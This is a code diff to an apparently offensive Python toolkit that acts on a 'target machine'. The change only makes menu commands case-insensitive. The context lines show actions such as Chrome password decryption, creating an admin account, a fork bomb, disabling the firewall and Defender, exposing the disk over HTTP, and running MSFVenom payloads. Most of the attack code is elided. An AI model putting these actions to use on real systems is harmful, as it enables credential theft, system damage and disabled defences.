@@ -549,7 +549,7 @@ while True:
 #
 #
 #Action DiskFiller = filling up disk space
-    if action == "DiskFill":
+    if action == "DiskFill" or action == "diskfill":
         logging.info(f"Chose action DiskFill to fill a target computer disk")
         usermovefile=input("Did you move the installed files from each other? (meaning this program being somewhere different than the other files included in this repo? y/n: ")
         if usermovefile == "y":
@@ -575,7 +575,7 @@ while True:
 #
 #
 #Action DiskHoster = hosting target disk on local network
-    if action == "DiskHost":
+    if action == "DiskHost" or action == "diskhost":
         logging.info(f"Chosen action DiskHost to host target disk onto a local network")
         hostdisk="python -m http.server 8100 --bind 0.0.0.0"
         run_ps(hostdisk)
@@ -601,7 +601,7 @@ while True:
 #
 #
 #Action AddAdmin = creating new admin account on target machine
-    if action =="AddAdmin":
+    if action =="AddAdmin" or action == "addadmin":
         logging.info(f"Chosen action AddAdmin to generate a new admin account on target machine")
         newadminuser=input("Enter new admin username: ")
         sleep(0.1)
@@ -630,7 +630,7 @@ while True:
 #
 #
 #Action PassExport = retrieving Chrome saved passwords
-    if action == "PassExport":
+    if action == "PassExport" or action == "passexport":
         logging.info(f"Chosen action PassExport to retrieve Chrome browsing history")
         
         # Check if we're on Windows
@@ -871,7 +871,7 @@ while True:
 
 
 
-    if action == "ForkBomb":
+    if action == "ForkBomb" or action == "forkbomb":
         logging.info(f"Chosen to attempt a forkbomb")
         # Create the fork bomb batch file
         run_ps('New-Item -Path "Friend.bat" -ItemType File -Force')
@@ -898,7 +898,7 @@ while True:
     # 
 
 #action PortOpener = opening ports in firewall
-    if action == "PortOpener":
+    if action == "PortOpener" or action == "portopener":
         logging.info(f"Chosen action PortOpener to open ports in firewall")
         PortOpenerContinue=input("This action will take down the entire firewall and windows defender protection, are you sure you want to continue?")
         if PortOpenerContinue == "y":
@@ -943,7 +943,7 @@ while True:
 
 
 #action PacketCapture = capturing packets on target machine
-    if action == "PacketCapture":
+    if action == "PacketCapture" or action == "packetcapture":
         logging.info(f"Chosen action PacketCapture to capture packets")
         run_ps('& "C:\\Program Files\\Wireshark\\dumpcap.exe" -D')
 
@@ -967,7 +967,7 @@ while True:
 #
 #
     
-    if action == "Venom":
+    if action == "Venom" or action == "venom":
         logging.info(f"Chosen action Venom to run a Venom payload")
         venom=input("Enter full path to the payload (example D:\\USB\\Attack\\Venom\\payload.exe): ")
         run_ps(venom)
@@ -1031,7 +1031,7 @@ while True:
         input("Press Enter to continue...")
         cls()
 
-    if action == "info DiskFill":
+    if action == "info DiskFill" or action == "info diskfill":
         print("DiskFill) Run diskfiller to fill up disk space: runs diskfiller.bat to fill up disk space on target machine") 
         sleep(0.1) 
         print("")
@@ -1039,7 +1039,7 @@ while True:
         input("Press Enter to continue...")
         cls()
 
-    if action == "info DiskHost":
+    if action == "info DiskHost" or action == "info diskhost":
         print("DiskHost) Localy host a disk of the target machine: hosts current folder via python http server on port 8100") 
         sleep(0.1) 
         print("")
@@ -1047,7 +1047,7 @@ while True:
         input("Press Enter to continue...")
         cls()
 
-    if action == "info AddAdmin":
+    if action == "info AddAdmin" or action == "info addadmin":
         print("AddAdmin) Generate a new admin account on target machine: creates a new user and adds it to local administrators group") 
         sleep(0.1) 
         print("")
@@ -1055,7 +1055,7 @@ while True:
         input("Press Enter to continue...")
         cls()
 
-    if action == "info PassExport":
+    if action == "info PassExport" or action == "info passexport":
         print("PassExport) Export browser saved passwords (Chrome only): retrieves and decrypts saved passwords from Chrome browser, saves results to chrome_passwords.json") 
         sleep(0.1) 
         print("")
@@ -1063,7 +1063,7 @@ while True:
         input("Press Enter to continue...")
         cls()
 
-    if action == "info ForkBomb":
+    if action == "info ForkBomb" or action == "info forkbomb":
         print("ForkBomb) Attempt a forkbomb on current machine: creates and runs a batch file that continuously spawns new instances of itself, potentially crashing the system") 
         sleep(0.1) 
         print("")
@@ -1071,7 +1071,7 @@ while True:
         input("Press Enter to continue...")
         cls()
 
-    if action == "info PortOpener":
+    if action == "info PortOpener" or action == "info portopener":
         print("PortOpener) Open ports in firewall: disables Windows Firewall and Windows Defender real-time protection, deletes all existing firewall rules") 
         sleep(0.1) 
         print("")
@@ -1079,7 +1079,7 @@ while True:
         input("Press Enter to continue...")
         cls()
     
-    if action == "info PacketCapture":
+    if action == "info PacketCapture" or action == "info packetcapture":
         print("PacketCapture) Capture packets on target machine: uses Wireshark's dumpcap to capture network packets on a specified interface and save them to a pcapng file") 
         sleep(0.1) 
         print("")
@@ -1087,7 +1087,7 @@ while True:
         input("Press Enter to continue...")
         cls()
 
-    if action == "info Venom":
+    if action == "info Venom" or action == "info venom":
         print("Venom) Run a Venom payload: allows the execution of an .exe file which was generated using MSFVenom and saved into VenomPayload using attackersetup.sh") 
         sleep(0.1) 
         print("")
